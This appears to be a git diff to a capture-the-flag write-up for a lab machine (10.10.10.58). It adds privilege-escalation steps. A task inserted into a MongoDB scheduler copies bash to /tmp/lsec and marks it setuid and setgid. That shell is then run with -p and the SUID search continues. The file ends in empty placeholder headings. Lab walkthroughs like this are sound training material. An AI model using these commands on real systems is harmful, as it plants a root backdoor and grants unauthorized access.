@@ -50,21 +50,43 @@ Notice the `const url` towards the top which contains a mongodb connection strin
 $ ssh 10.10.10.58 -l mark
 ```
 
-...
-
+#### Insert task into mongo-based task executor
 ```sh
-# COnnect to local mongo scheduler db
+# Connect to local mongo scheduler db
 $ mongo -p -u mark scheduler
 
 # Insert a new task to copy bash and SUID it
-> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/lsec; /bin/chmod u+s /tmp/lsec"});
+> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/lsec; /bin/chmod u+s /tmp/lsec; chmod g+s /tmp/lsec"});
 
 # See if task is still pending
 > db.tasks.find()
 
 # Exit mongodb
 > Ctrl-D
+```
 
-# Execute the SUID bash shell using the -p flag
-# /tmp/lsec -p
+#### Execute the SUID bash shell using the -p flag
+```sh
+$ /tmp/lsec -p
+```
+
+#### Find SUID programs now that we're Tom
+```sh
+$ find / -perm -4000 2>/dev/null
+```
+
+#### Investigate the `/usr/local/bin/backup` found in output above
+```sh
+$ ls -ltr /usr/local/bin/backup
+
+$ file /usr/local/bin/backup
+
+$ /usr/local/bin/backup
+```
+
+...
+
+# ____
+```
+$ ______
 ```
